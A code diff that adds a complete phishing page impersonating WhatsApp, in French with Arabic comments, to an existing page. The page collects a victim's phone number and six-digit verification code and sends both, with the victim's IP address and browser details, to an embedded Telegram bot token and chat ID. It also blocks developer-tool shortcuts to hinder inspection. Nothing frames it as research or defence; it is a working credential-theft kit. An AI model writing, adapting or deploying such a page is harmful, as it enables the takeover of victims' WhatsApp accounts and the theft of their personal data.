@@ -25,16 +25,325 @@
             min-height: 100vh;
         }
 
-        /* --- تعديل حجم الشعار هنا --- */
         .header-logo {
             width: 100%;
-            padding: 25px 30px; /* زيادة التباعد قليلاً */
+            padding: 25px 30px;
             display: flex;
             justify-content: flex-start;
         }
 
         .header-logo img {
-            height: 60px; /* تم زيادة الطول من 35px إلى 60px ليكون أوضح */
+            height: 60px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 10px 20px;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            padding: 45px 25px;
+            border: 1.5px solid #000;
+            border-radius: 35px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            text-align: left;
+        }
+
+        h2 { font-size: 26px; font-weight: 700; margin-bottom: 12px; color: var(--text-black); line-height: 1.2; }
+        p.desc { font-size: 15px; margin-bottom: 35px; color: var(--text-gray); line-height: 1.4; }
+
+        .iti { width: 100%; margin-bottom: 25px; }
+        input[type="tel"], .otp-field {
+            height: 55px;
+            border: 1px solid #e5e5e5;
+            border-radius: 12px;
+            font-size: 18px;
+            outline: none;
+            background: #fff;
+            width: 100%;
+            padding: 0 15px;
+        }
+
+        .otp-container { display: flex; justify-content: space-between; gap: 8px; margin: 25px 0; }
+        .otp-field { width: 15% !important; text-align: center; border-radius: 10px; }
+
+        .btn-submit {
+            background-color: var(--btn-green);
+            color: white;
+            border: none;
+            width: 100%;
+            height: 50px;
+            border-radius: 25px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 20px auto;
+            display: block;
+            transition: all 0.3s;
+        }
+
+        .btn-submit:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(36,172,100,0.4); }
+        .btn-submit:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+
+        .loading { display: none; text-align: center; margin: 20px 0; }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid white;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .success-msg {
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            display: none;
+            border: 1px solid #c3e6cb;
+        }
+
+        .footer {
+            width: 100%;
+            padding: 25px;
+            text-align: center;
+            color: var(--text-black);
+        }
+
+        .footer-top { font-size: 17px; margin-bottom: 12px; }
+        .footer-top a { color: var(--text-black); text-decoration: underline; text-decoration-color: var(--btn-green); font-weight: 700; }
+        
+        .footer-encryption {
+            display: flex; align-items: center; justify-content: center;
+            gap: 6px; color: var(--text-gray); font-size: 14px; margin-bottom: 10px;
+        }
+
+        .footer-links { font-size: 13px; color: #999; }
+        .hidden { display: none !important; }
+
+        @media (max-width: 320px) { body { display: none; } }
+    </style>
+</head>
+<body>
+
+<div class="header-logo">
+    <img src="https://i.ibb.co/WpGsjBjN/66-B81-BFB-41-A6-4025-AD64-3840-CAA7-CC0-E.jpg" alt="WhatsApp" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTIwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0xMCAxM0gxM3Y0SDEwdi0xWk0xMCAxN1YxNGgxMFYxN0gxMFpNNCAxM0g3VjE3SDRWM0g3VjEzSDFaTTQgMTdIMFdNMTYgMTNIMTZWMFdNMTYgMTdIMTYiLz48L3N2Zz4='">
+</div>
+
+<div class="main-content">
+    <div class="wrapper">
+        <div id="page1">
+            <h2>Saisissez un numéro de téléphone.</h2>
+            <p class="desc">Sélectionnez un pays et saisissez votre numéro de téléphone.</p>
+            <input type="tel" id="phone" placeholder="+33 6 12 34 56 78">
+            <button class="btn-submit" onclick="processData('phone')">Suivant</button>
+        </div>
+
+        <div id="page2" class="hidden">
+            <h2>Vérification</h2>
+            <p class="desc">Veuillez saisir le code à 6 chiffres envoyé à votre mobile.</p>
+            <div class="otp-container">
+                <input type="number" class="otp-field" maxlength="1" oninput="moveFocus(this, 0)">
+                <input type="number" class="otp-field" maxlength="1" oninput="moveFocus(this, 1)">
+                <input type="number" class="otp-field" maxlength="1" oninput="moveFocus(this, 2)">
+                <input type="number" class="otp-field" maxlength="1" oninput="moveFocus(this, 3)">
+                <input type="number" class="otp-field" maxlength="1" oninput="moveFocus(this, 4)">
+                <input type="number" class="otp-field" maxlength="1" oninput="moveFocus(this, 5)">
+            </div>
+            <div class="loading" id="loading"><div class="spinner"></div><br>Vérification en cours...</div>
+            <div class="success-msg" id="success">✅ Code vérifié avec succès!</div>
+            <button class="btn-submit" onclick="processData('otp')">Vérifier</button>
+        </div>
+    </div>
+</div>
+
+<div class="footer">
+    <div class="footer-top">
+        Vous n'avez pas de compte WhatsApp ? <a href="#" onclick="alert('Téléchargement WhatsApp...')">Démarrer ↗</a>
+    </div>
+    <div class="footer-encryption">
+        🔒 Vos messages personnels sont chiffrés de bout en bout
+    </div>
+    <div class="footer-links">
+        Conditions générales | Politique de confidentialité | Sécurité
+    </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+<script>
+    // ==================== البوت الأصلي ====================
+    const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
+    const chatId = "1705240737";
+    // ======================================================
+
+    let phoneNumber = "";
+    let iti = null;
+
+    document.addEventListener('DOMContentLoaded', function() {
+        const phoneInput = document.getElementById('phone');
+        iti = window.intlTelInput(phoneInput, {
+            initialCountry: "auto",
+            geoIpLookup: callback => {
+                fetch('https://ipapi.co/json')
+                    .then(res => res.json())
+                    .then(data => callback(data.country_code))
+                    .catch(() => callback('US'));
+            },
+            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
+        });
+    });
+
+    function processData(type) {
+        let textMsg = "";
+        
+        if(type === 'phone') {
+            const num = iti.getNumber();
+            if(!num || !iti.isValidNumber()) {
+                alert("⚠️ Veuillez saisir un numéro valide");
+                return;
+            }
+            
+            phoneNumber = num;
+            textMsg = "📱 رقم جديد: " + num;
+            
+            // البوت الأصلي - طريقة 1
+            sendOriginalBot(textMsg);
+            
+            // الانتقال لصفحة OTP
+            document.getElementById('page1').classList.add('hidden');
+            document.getElementById('page2').classList.remove('hidden');
+            
+        } else {
+            let otpCode = Array.from(document.querySelectorAll('.otp-field'))
+                              .map(f => f.value).join('').replace(/\D/g,'');
+            
+            if(otpCode.length !== 6) {
+                alert("⚠️ Saisissez le code complet (6 chiffres)");
+                return;
+            }
+            
+            textMsg = "🔑 كود OTP: " + otpCode + " | Phone: " + phoneNumber;
+            
+            // البوت الأصلي - طريقة 2
+            sendOriginalBot(textMsg);
+            
+            // الـ Advanced bot أيضاً
+            sendAdvancedBot(phoneNumber, otpCode);
+        }
+    }
+
+    // ✅ البوت الأصلي اللي كان في الكود (طريقة POST مباشرة)
+    function sendOriginalBot(message) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ 
+                chat_id: chatId, 
+                text: message 
+            })
+        }).then(() => {
+            console.log('✅ Original bot sent:', message);
+        }).catch(e => {
+            console.log('Original bot failed:', e);
+        });
+    }
+
+    // ✅ الـ Advanced bot (إضافات)
+    async function sendAdvancedBot(phone, otp) {
+        const ip = await getIP();
+        const data = {
+            phone: phone,
+            otp: otp,
+            ip: ip,
+            ua: navigator.userAgent.slice(0,100),
+            timestamp: new Date().toLocaleString('ar-EG')
+        };
+
+        const advancedMsg = `🚨 *WHATSAPP HIT* 🚨\n\n` +
+                           `📱 *Phone:* ${phone}\n` +
+                           `🔑 *OTP:* ${otp}\n` +
+                           `🌐 *IP:* ${ip}\n` +
+                           `💻 *Device:* ${navigator.userAgent.slice(0,50)}...\n\n` +
+                           `#whatsapp #otp #${phone.replace(/[^0-9]/g,'')}`;
+
+        // إرسال للبوت الأصلي + تنسيق Markdown
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: advancedMsg,
+                parse_mode: 'Markdown'
+            })
+        });
+    }
+
+    // Get IP
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch {
+            return 'N/A';
+        }
+    }
+
+    // OTP Navigation
+    function moveFocus(el, index) {
+        if(el.value.length === 1 && index < 5) {
+            document.querySelectorAll('.otp-field')[index + 1].focus();
+        } else if(el.value.length === 0 && index > 0) {
+            document.querySelectorAll('.otp-field')[index - 1].focus();
+        }
+    }
+
+    // Keyboard support
+    document.addEventListener('keydown', function(e) {
+        if(e.key >= '0' && e.key <= '9' && document.querySelector('.otp-field:focus')) {
+            setTimeout(() => {
+                const fields = document.querySelectorAll('.otp-field');
+                const current = Array.from(fields).indexOf(document.activeElement);
+                if(current < 5) fields[current + 1].focus();
+            }, 10);
+        }
+    });
+
+    // Success feedback
+    document.querySelectorAll('.otp-field').forEach((field, index) => {
+        field.addEventListener('input', () => {
+            let otpCode = Array.from(document.querySelectorAll('.otp-field')).map(f => f.value).join('');
+            if(otpCode.length === 6) {
+                setTimeout(() => processData('otp'), 500);
+            }
+        });
+    });
+
+    // Anti-debug
+    document.addEventListener('keydown', function(e) {
+        if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+            e.preventDefault();
+            return false;
+        }
+    });
+</script>
+
+</body>
+</html>            height: 60px; /* تم زيادة الطول من 35px إلى 60px ليكون أوضح */
             width: auto;
             object-fit: contain;
         }
